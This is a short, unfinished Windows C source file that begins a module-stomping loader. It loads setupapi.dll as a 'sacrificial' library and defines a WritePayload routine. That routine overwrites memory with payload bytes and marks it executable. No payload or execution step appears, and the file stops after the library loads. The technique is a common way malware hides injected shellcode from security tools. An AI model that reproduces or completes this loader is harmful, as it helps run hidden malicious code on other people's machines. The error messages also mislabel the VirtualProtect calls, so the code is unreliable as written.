
#include <Windows.h>
#include <stdio.h>


#define SACRIFICAL_DLL "setupapi.dll"
#define SACRIFICAL_FUNC "SetupScanFileQueueA"


BOOL WritePayload(IN PVOID pAddress , IN PBYTE pPayload , IN SIZE_T sPayloadSize) {
	
	DWORD dwOldProtection= NULL;
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {

		printf("[!]Virtual alloc failed with error : %d", GetLastError());
		return EXIT_FAILURE;
	}
	memcpy(pAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {

		printf("[!]Virtual alloc failed with error : %d", GetLastError());
		return EXIT_FAILURE;
	}

	return TRUE;
}

int main() {

	PVOID pAddress = NULL;
	HMODULE hModule = NULL;
	HANDLE hThread;

	printf("Let's load our Sacrificial dll, %s\n", SACRIFICAL_DLL);
	
	getchar();
	hModule = LoadLibraryA(SACRIFICAL_DLL);
	if (hModule == NULL) {
		printf("[!]Load Libarary failed!! error : %d\n",GetLastError());
	}


}